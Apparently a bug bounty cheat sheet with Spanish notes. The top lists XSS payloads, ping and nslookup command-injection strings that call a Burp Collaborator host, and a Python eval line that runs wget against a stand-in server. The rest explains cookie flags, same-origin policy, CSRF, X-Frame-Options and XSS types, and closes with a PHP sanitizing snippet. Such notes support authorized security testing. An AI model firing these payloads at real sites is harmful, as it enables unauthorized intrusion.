# BugBounty_tips

#Xss
%u003Csvg onload=alert(1)> \
%u3008svg onload=alert(2)> \
%uFF1Csvg onload=alert(3)> \
=<img%20src=x%20onerror=alert('Welcome,%20v
q=<g><script>alert%28document.domain%29<%2Fscript>   
<img src=x onerror=console.log("XSS")>   
‘);</script><script>alert(1)</script>  
{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}

#Command Injection
url/cgi-bin/parameter=payload
payload 1 [PING]
|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1 
payload 2 [Nslookup]
|nslookup -q=cname http://YOUR.burpcollaborator.net.&

POC Code: eval(compile(“””for x in range(1):\n import os\n os.popen(r’wget http://vpsip.com:8000').read()""",'','single'))

POC Code: eval%28compile%28%27for%20x%20in%20range%281%29%3A%0A%20import%20time%0A%20time.sleep%2820%29%27%2C%27a%27%2C%27single%27%29%29

  
cookie atributes
Las cookies son utilizadas a menudo en aplicaciones web para identificar a un usuario y su sesión
Creando
Set-Cookie: <nombre-cookie>=<valor-cookie>
Session
Expires
 
Securizar
Cookies Secure y HttpOnly
Secure es un parámetro para indicar que una cookie solo debería ser utilizada bajo un servidor seguro, tal como SSL
Previene la lectura y modificacion
Para prevenir ataques cross-site scripting (XSS (en-US)), las cookies HttpOnly son inaccesibles desde la API de Javascript Document.cookie; Solamente se envían al servidor. Por ejemplo, las cookies que persisten sesiones del lado del servidor no necesitan estar disponibles para JavaScript, por lo que debería establecerse el flag HttpOnly.

Alcance
Las directivas Domain y Path definen el alcance de la cookie: a qué URLs deberían enviarse las cookies.
Domain : especifica los hosts permitidos
Path   : espeficia directorios
Samesite
SameSite=Strict
Si una cookie same-site tiene este atributo, el navegador sólo enviará cookies si la solicitud se originó en el sitio web que estableció la cookie.y no hara en origenes distintos
Lax
Si el atributo se establece en Lax, las cookies same-site se retienen en (sub)peticiones cross-site, tales como llamadas para cargar imágenes o frames
Acceso desde JavaScript usando Document.cookie
También se pueden crear nuevas cookies via JavaScript usando la propiedad Document.cookie, y si el flag HttpOnly no está establecido

Tracking no legal  
HOW WORKS HTTPONLY
https://www.youtube.com/watch?v=d8liHExs5tc
https://www.youtube.com/watch?v=ZSUGfIy1ds8
https://www.youtube.com/watch?v=brNL_bvUCck


 
SameOriginPolicy Sop
https://developer.mozilla.org/es/docs/Web/Security/Same-origin_policy
Origen se refiere a si dos pagunas tienen el protocolo y el mismo puerto .
La política same-origin (mismo-origen) restringe cómo un documento o script cargado desde un origen puede interactuar con un recurso de otro origen. Es un mecanismo de seguridad crítico para aislar documentos potencialmente malicioso
Es impedir que dominios que no compartan el mismo host, puerto y protocolo sean capaces de acceder a la información de otro dominio

CSRF
Los endpoints GET no deben tener acciones de modificación, y si esto se necesita se debería requerir una petición POST. Además los endpoints POST no debería aceptar la intercambiabilidad de aceptar peticiones GET con parametros en query string
Un token CSRF debería ser incluido en cada elemento <form> mediante un input oculto. Este token debe ser único para cada usuario y almacenado (por ejemplo, en una cookie). De esta forma el servidor puede mirar si el valor requerido es enviado, y en cierto modo lo idea sería descartar la petición si el valor no concuerda con lo esperado.
Este método de protección recae en la imposibilidad de que un atacante pueda predecir este token autogenerado en cada inicio de sesión. Cabe aclarar que este token debería ser regenerado en cada inicio de sesión.
Al igual que con {{Glosario ("XSS")}}, el filtrado de entrada es importante.
Debería de existir siempre un requerimiento de confirmación para cualquier acción delicada,.
Las cookies empleadas en acciones delicadas deberían de tener una vida útil breve.

PREVENIR
https://www.youtube.com/watch?v=KvE3nifqELk
QUE LAS PETICIONES VENGAN DE SITIOS CONOCIDOS - ip - dominios 
POST - PETCIONES ASINCRONAS CON AJAX
HTTP_REFERER
mejor que lo anterior
HEAD
METER EL TOKEN EN HEAD EN UNA COOKIE
  
X-Frame-Options
La página sólo puede ser mostrada en un marco del mismo origen que dicha página.
X-Frame-Options: DENY
La página no puede ser mostrada en un marco, independiente del sitio que esté intentándolo.
X-Frame-Options: SAMEORIGIN
La página sólo puede ser mostrada en un marco del mismo origen que dicha página.
X-Frame-Options: ALLOW-FROM https://example.com/
La página sólo puede ser mostrada en un marco del origen especificado.Tenga en cuenta que en Firefox esto todavía sufre del mismo problema que SAMEORIGIN
  
SOLUCIÓN
Apache
Header always append X-Frame-Options SAMEORIGIN
Header set X-Frame-Options DENY
Header set X-Frame-Options "ALLOW-FROM https://example.com/"
Nginx
add_header X-Frame-Options SAMEORIGIN;
IIS
<system.webServer>
   <httpProtocol>
    <customHeaders>
      <add name="X-Frame-Options" value="SAMEORIGIN" />
    </customHeaders>
  </httpProtocol>
</system.webServer>
  
https://www.arsys.es/blog/instalar-fail2ban/

XSS
Cross Site Scripting (XSS) es un tipo de vulnerabilidad en 
las aplicaciones Web donde el atacante puede inyectar código 
JavaScript en el navegador de su víctima. 
 
Reflected: Cuando la aplicación refleja algún dato recibido 
por parámetro en un request HTTP sin sanitizar.
Stored: Similar al reflected pero los datos no sanitizados son 
guardados en la base de datos.
DOM Based: El payload XSS se ejecuta como resultado de la 
modificación del "entorno" DOM en el navegador de la víctima. 
(la vulnerabilidad existe en el código del lado del cliente en lugar del 
código del lado del servidor).
 
------------------------------------------------------------------------------
SOLUCION
/* Prevent XSS input */
$_GET   = filter_input_array(INPUT_GET, FILTER_SANITIZE_STRING);
$_POST  = filter_input_array(INPUT_POST, FILTER_SANITIZE_STRING);
/* I prefer not to use $_REQUEST...but for those who do: */
$_REQUEST = (array)$_POST + (array)$_GET + (array)$_REQUEST;
  
  
  
  

